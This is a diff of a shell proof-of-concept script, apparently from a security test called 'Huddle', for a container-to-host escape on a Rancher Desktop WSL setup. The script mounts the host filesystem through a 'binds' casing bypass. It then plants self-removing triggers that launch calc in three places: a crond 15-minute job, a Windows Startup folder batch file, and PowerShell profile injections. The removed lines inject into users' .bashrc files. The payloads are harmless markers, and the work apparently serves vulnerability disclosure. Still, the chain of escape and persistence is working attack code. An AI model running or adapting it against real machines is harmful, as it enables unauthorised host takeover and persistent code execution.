@@ -178,62 +178,85 @@ echo "wrote proof (host) $P"'
   [[ -z "$CID" ]] && refused
   CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / mounted at /host, rw)"; run_and_log "$CID"
   ;;
-# ── Finding #1 (fs): filesystem-only calc pop via PowerShell profile injection ─
-# No privileged, no pidmode, no nsenter, no binfmt_misc. Mount host rootfs via
-# the 1b-style bypass (lowercase `binds` under properly-cased `HostConfig`).
-# The host is a Docker-specific WSL2 distro — no user shells ever open there.
-# But /host/mnt/c/ gives us the Windows filesystem. Inject a self-removing
-# one-liner into the Windows user's PowerShell profile: fires on next terminal
-# (PowerShell, Windows Terminal, VS Code integrated terminal).
+# ── Finding #1 (fs): filesystem-only calc pop — multi-vector ──────────────────
+# No privileged, no pidmode, no nsenter. Mount host rootfs via the 1b-style
+# bypass (lowercase `binds` under properly-cased `HostConfig`).
+# Host is Rancher Desktop WSL distro: crond runs /etc/periodic/15min every 15m,
+# binfmt_misc WSLInterop is registered (flags: P). Three trigger mechanisms:
+#   1. crond /etc/periodic/15min — fires within 15 min, no user interaction
+#   2. Windows Startup folder   — fires on next Windows logon
+#   3. PowerShell profile       — fires on next terminal (if profile dir exists)
+# All payloads self-remove after first execution.
 fs)
   pull
   FSPOP='set +e
-echo "[*] host rootfs at /host — scanning for Windows users ..."
+echo "[*] host rootfs at /host — deploying calc-pop triggers ..."
 MARKER="HUDDLE_POC_CALCPOP"
-INJECTED=0
+TRIGGERED=0
 
-# ── PowerShell profiles (fires on any PS / Windows Terminal / VS Code terminal)
+# ── 1) crond periodic job (fires within <=15 min, no user interaction needed)
+# Rancher Desktop WSL runs crond with /etc/periodic/15min. binfmt_misc
+# WSLInterop is registered (flags:P), so cmd.exe works natively from here.
+CRONDIR="/host/etc/periodic/15min"
+if [ -d "$CRONDIR" ]; then
+  CRONSCRIPT="$CRONDIR/huddle-poc-calcpop"
+  cat > "$CRONSCRIPT" << "CRONEOF"
+#!/bin/sh
+# HUDDLE_POC_CALCPOP — self-removing PoC (fires once via crond, then deletes)
+export WSL_INTEROP="$(ls /run/WSL/*_interop 2>/dev/null | head -1)"
+if [ -n "$WSL_INTEROP" ]; then
+  /mnt/c/Windows/System32/cmd.exe /c start calc >/dev/null 2>&1 &
+fi
+rm -f "$0"
+CRONEOF
+  chmod +x "$CRONSCRIPT"
+  echo "[+] wrote $CRONSCRIPT (crond fires within 15 min, self-deletes)"
+  TRIGGERED=$((TRIGGERED + 1))
+else
+  echo "[!] no /etc/periodic/15min — crond path unavailable"
+fi
+
+# ── 2) Windows Startup folder (fires on next Windows logon)
 for userdir in /host/mnt/c/Users/*/; do
   user=$(basename "$userdir")
   case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
-  [ -d "$userdir" ] || continue
-
-  # WindowsPowerShell (PS5) + PowerShell (PS7) profile paths
-  for psdir in \
-    "${userdir}Documents/WindowsPowerShell" \
-    "${userdir}Documents/PowerShell" \
-    "${userdir}OneDrive/Documents/WindowsPowerShell" \
-    "${userdir}OneDrive/Documents/PowerShell"; do
-    # Only target dirs that exist (do not create profile dirs that never existed)
-    [ -d "$psdir" ] || continue
-    PROF="$psdir/Microsoft.PowerShell_profile.ps1"
-    # Skip if already injected
-    grep -q "$MARKER" "$PROF" 2>/dev/null && continue
-    # Self-removing one-liner: Start calc, then strip all marker lines from profile
-    echo "# ${MARKER}" >> "$PROF"
-    echo "Start-Process calc; (Get-Content \$PROFILE | Where-Object { \$_ -notmatch '\''"${MARKER}"'\'' }) | Set-Content \$PROFILE # ${MARKER}" >> "$PROF"
-    echo "[+] injected into $PROF"
-    INJECTED=$((INJECTED + 1))
-  done
+  STARTUP="${userdir}AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+  [ -d "$STARTUP" ] || continue
+  BAT="$STARTUP/huddle-poc.bat"
+  cat > "$BAT" << "BATEOF"
+@echo off
+rem HUDDLE_POC_CALCPOP — self-deleting PoC
+start calc
+(goto) 2>nul & del "%~f0"
+BATEOF
+  echo "[+] wrote $BAT (fires on next Windows logon, self-deletes)"
+  TRIGGERED=$((TRIGGERED + 1))
+  break
 done
 
-# ── Also try the user WSL distros (if cross-mounted at /mnt/wsl or visible)
-for rc in /host/home/*/.bashrc; do
-  [ -f "$rc" ] || continue
-  grep -q "$MARKER" "$rc" 2>/dev/null && continue
-  echo "# ${MARKER} — PoC injected by Huddle security test (self-removing)" >> "$rc"
-  echo "( cmd.exe /c start calc >/dev/null 2>&1 & ); sed -i \"/${MARKER}/d\" ~/{.bashrc,.profile} 2>/dev/null # ${MARKER}" >> "$rc"
-  echo "[+] injected into $rc (WSL distro bashrc)"
-  INJECTED=$((INJECTED + 1))
+# ── 3) PowerShell profile (fires on next PS/Terminal/VS Code terminal)
+for userdir in /host/mnt/c/Users/*/; do
+  user=$(basename "$userdir")
+  case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
+  for psdir in \
+    "${userdir}Documents/WindowsPowerShell" \
+    "${userdir}Documents/PowerShell"; do
+    [ -d "$psdir" ] || continue
+    PROF="$psdir/Microsoft.PowerShell_profile.ps1"
+    grep -q "$MARKER" "$PROF" 2>/dev/null && continue
+    echo "# ${MARKER}" >> "$PROF"
+    echo "Start-Process calc; (Get-Content \$PROFILE | Where-Object { \$_ -notmatch '"'"'"${MARKER}"'"'"' }) | Set-Content \$PROFILE # ${MARKER}" >> "$PROF"
+    echo "[+] injected into $PROF (fires on next PowerShell session, self-removes)"
+    TRIGGERED=$((TRIGGERED + 1))
+  done
 done
 
 echo ""
 echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
-if [ "$INJECTED" -gt 0 ]; then
-  echo "[+] injected $INJECTED profile(s). Calc pops on next terminal open."
-  echo "[*] all injections self-remove after first trigger."
+if [ "$TRIGGERED" -gt 0 ]; then
+  echo "[+] deployed $TRIGGERED trigger(s). All self-remove after first execution."
 else
-  echo "[!] no profile targets found — writing proof file instead"
+  echo "[!] no trigger paths found — writing proof file instead"
   echo "HUDDLE HOST-ESCAPE PoC — filesystem write confirmed" > /host/tmp/huddle-poc-proof.txt
   echo "host: $(cat /host/etc/hostname 2>/dev/null)" >> /host/tmp/huddle-poc-proof.txt
   echo "[+] wrote /host/tmp/huddle-poc-proof.txt"
